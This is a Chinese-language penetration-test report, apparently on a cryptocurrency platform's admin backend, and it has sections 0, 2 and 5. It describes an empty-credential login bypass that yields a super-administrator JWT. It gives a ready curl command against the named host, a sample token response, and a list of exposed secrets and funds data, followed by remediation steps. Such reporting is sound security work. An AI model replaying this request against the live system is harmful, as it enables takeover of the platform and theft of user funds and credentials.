## 0. 执行摘要

对 `https://52.76.104.254` 的后台 SPA 进行资产识别后，定位到后端 API 域 `exchange-module.complex-z.com`。  
登录入口为混淆路径 **`POST /x7k9m2/entry`**。

**根因漏洞：未授权身份签发（Authentication Bypass）**  
对登录入口提交 **空 JSON `{}`**（无账号/密码/OTP）即可返回 `sr.sc=0` 与有效 **JWT**，JWT 对应用户 **account_id=242、角色=超级管理员**。

利用该 token 成功调用：

- 当前用户信息（含 **Google Auth 密钥明文**、密码哈希）
- 平台列表 / 余额相关统计
- 角色与权限树
- USDT 充值地址
- 平台 API Key 列表
- 用户登录记录、资金流水等

**控制判据全部满足。**

## 2. 关键漏洞：未授权登录签发 JWT

### 2.1 复现

```bash
curl -k -X POST "https://exchange-module.complex-z.com/x7k9m2/entry" \
  -H "Content-Type: application/json" \
  -H "Origin: https://52.76.104.254" \
  -H "Referer: https://52.76.104.254/" \
  -d "{}"
```

### 2.2 响应（样例）

```json
{
  "sr": { "sc": 0, "rp": "成功" },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...."
}
```

JWT payload（解码）：

```json
{
  "platform_id": "",
  "account_id": "242",
  "account_name": "",
  "iss": "242",
  "exp": 1784836270
}
```

### 2.3 严重性

| 维度 | 说明 |
|------|------|
| 影响 | 任意互联网访问者可获取**超级管理员会话** |
| 条件 | 无账号、无密码、无 2FA |
| 根因 | 登录处理器对空/缺省凭据仍走“成功签发”分支（或默认账号 242 空口令逻辑） |
| 关联证据 | `password_hashed = d41d8cd98f00b204e9800998ecf8427e`（**空字符串 MD5**） |

## 5. 风险评级与修复

### P0 — 立即

1. **修复 `/x7k9m2/entry` 空凭据签发**  
   - 必须校验账号密码（及 OTP）  
   - 失败不得返回 token  
2. **轮换所有受影响密钥**  
   - 失效既有 JWT 签名密钥  
   - 重置 account 242 及所有管理员密码  
   - **轮换 Google `auth_secret`**（已泄露）  
   - 轮换/吊销 `platformApiKey`  
   - 评估 USDT 地址是否被替换风险  
3. **禁止空密码账户**（当前 hash=空 MD5）  
4. **强制 white_ip / 管理端 VPN**

### P1

5. token 放 body 可改为 Authorization + 短过期 + 刷新

7. 审计 `wangji` 账号与创建来源  
8. 前端去除/勿下发 `auth_secret` 明文
